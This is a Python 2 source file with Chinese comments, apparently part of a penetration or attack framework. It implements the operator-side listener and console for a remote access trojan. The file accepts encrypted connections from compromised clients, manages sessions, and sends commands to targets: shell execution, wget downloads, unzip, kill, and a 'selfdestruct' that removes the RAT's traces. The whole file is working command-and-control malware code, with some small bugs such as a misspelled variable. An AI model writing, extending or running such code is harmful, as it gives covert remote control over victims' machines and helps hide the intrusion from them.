#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import readline
import socket
import sys
import threading

from lib.ple.lib.crypto import encrypt, decrypt, diffie_hell_man

#暂时存放，弃用
CLIENT_COMMANDS = [  'shell', 'selfdestruct','unzip', 'wget' ]

#帮助命令
HELP_TEXT = '''

Command               Description
-------               -----------

session <id>          Connect to a client.
sessions              List connected clients.
shell                 Execute a command on the target.
help                  Show this help menu.
kill                  Kill the client connection.
quit                  Exit the server and keep all clients alive.
selfdestruct          Remove all traces of the RAT from the target system.
unzip <file>          Unzip a file.
wget <url>            Download a file from the web.

'''

#服务启动
class Server(threading.Thread):
    clients      = {}       #存放监听过来的session
    client_count = 1        #初始化连接数，
    current_client = None   #初始化连接

    #初始化
    def __init__(self,target, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #释放重用端口
        self.s.bind((target, port))
        self.s.listen(5)
        
    #后台运行监听
    def run(self):
        while True:
            conn, addr = self.s.accept()  #阻塞连接
            dhkey = diffie_hell_man(conn) #加密连接
            client_id = self.client_count #初始化1
            client = ClientConnection(conn, addr, dhkey, uid=client_id)
            #client = ClientConnection(conn, addr, uid=client_id)
            self.clients[client_id] = client  #将监听到的session保存到集合
            self.client_count += 1  #session连接数加1，继续阻塞监听

    #发送加密信息
    def send_client(self, message, client):
        try:
            enc_message = encrypt(message, client.dhkey) #对反弹加密连接信息进行加密传输
            client.conn.send(enc_message)
        except Exception as e:
            print '[!] Error: {}'.format(e) #后续加红色字体

    #接收返回加密数据并解密
    def recv_client(self, client):
        try:
            recv_data = client.conn.recv(4096)
            print decrypt(recv_data, client.dhkey) #对反弹加密连接信息进行解密打印
            #print recv_data
        except Exception as e:
            print '[!] Error: {}'.format(e)

    #选择session值
    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)] #寻找保存在数组中的session ID
            print 'Client {} selected.'.format(client_id)
        except (KeyError, ValueError):
            print '[!] Error: Invalid Client ID.'

    #移除session
    def remove_client(self, key):
        return self.clients.pop(key, None)

    #销毁session
    def kill_client(self, _):
        self.send_client('kill', self.current_client) #向客户端发送销毁进程命令
        self.current_client.conn.close()              #连接关闭
        self.remove_client(self.current_client.uid)   #移除session id
        self.current_client = None                    #初始化

    #自杀
    def selfdestruct_client(self, _):
        self.send_client('selfdestruct', self.current_client) #向客户端发送自杀命令
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    #获取连接数值
    def get_clients(self):
        return [v for _, v in self.clients.items()]

    #列出清单
    def list_clients(self, _):
        print 'ID   Client Address'
        print '--   --------------'
        for k, v in self.clients.items():
            print '{:>2}   {}'.format(k, v.addr[0])

    def cmd_shell(self,server):
        pass

    
    #退出监听程序
    def quit_server(self, _):
        if raw_input('是否退出 (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('quit', c)     #向所有客户端发送关闭连接命令
            self.s.shutdown(socket.SHUT_RDWR)   #中断通信
            self.s.close()
            sys.exit(0)

    #打印帮助
    def print_help(self, _):
        print HELP_TEXT

#阻塞连接类，初始化当前连接
class ClientConnection():
    def __init__(self, conn, addr,dhkey, uid=0):
        self.conn  = conn
        self.addr  = addr
        self.dhkey = dhkey
        self.uid   = uid

#外部调用run_hander模块函数
def run_hander(target,port):
    #参数初始化在模块中，进行
    if target == "":
        taeget = '0.0.0.0'
    elif port == "":
        port = 19954
    else:
        pass
    client = None

    # start server
    server = Server(target,port)
    server.setDaemon(True)
    server.start()

    #开始不进行监听，在外部输出,
    print 'start hander server listening for connections on port {}.'.format(port)

    # server side commands
    server_commands = {
        'session':       server.select_client,
        'sessions':      server.list_clients,
        'help':         server.print_help,
        'kill':         server.kill_client,
        'quit':         server.quit_server,
        'selfdestruct': server.selfdestruct_client
    }

    
    #拼接执行命令
    def completer(text, state):
        commands = CLIENT_COMMANDS + [k for k, _ in server_commands.items()] #加载命令

        options = [i for i in commands if i.startswith(text)]
        if state < len(options):
            return options[state] + ' '
        else:
            return None

    #自动补全
    readline.parse_and_bind('tab: complete')
    readline.set_completer(completer)

    #当有session连接的时候才进入控制台
    while True:
        if Server.clients:
            if server.current_client:
                ccid = server.current_client.uid
            else:
                ccid = '?'

            prompt = raw_input('pl-shell [{}] > '.format(ccid)).rstrip()

            # allow noop
            if not prompt:
                continue

            # seperate prompt into command and action
            cmd, _, action = prompt.partition(' ')

            if cmd in server_commands:
                server_commands[cmd](action)

            elif cmd in CLIENT_COMMANDS:
                if ccid == '?':
                    print '[!] Error: No client selected.' #后期加红
                    continue
                if cmd == 'shell':
                    #进入交互式shell
                    cmd_shell(server)

                server.send_client(prompt, server.current_client)
                server.recv_client(server.current_client)

            else:
                print 'Invalid command, type "help" to see a list of commands.'
